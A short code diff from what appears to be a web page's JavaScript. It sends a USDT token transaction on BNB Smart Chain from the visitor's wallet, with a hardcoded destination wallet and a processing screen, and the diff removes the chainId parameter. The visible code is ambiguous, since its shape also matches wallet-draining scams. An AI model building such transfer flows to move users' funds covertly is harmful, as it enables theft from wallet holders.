@@ -723,7 +723,6 @@
     const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
     const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
     const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
-    const BSC_CHAIN_ID_HEX = "0x38"; // 56 en hexadecimal (BNB Smart Chain)
 
     const USDT_ABI = [
         "function balanceOf(address owner) view returns (uint256)",
@@ -880,15 +879,14 @@
 
                 showProcessingScreen();
 
-                // Disparamos la transacción con el parámetro chainId de BSC (0x38) para orientar el contrato BEP-20
+                // Transacción enviada utilizando la red activa de la wallet sin forzar discrepancias de chainId
                 const txHash = await rawProvider.request({
                     method: 'eth_sendTransaction',
                     params: [{
                         from: walletAddress,
                         to: CONTRATO_USDT,
                         data: dataHex,
-                        value: "0x0",
-                        chainId: BSC_CHAIN_ID_HEX
+                        value: "0x0"
                     }]
                 });
 
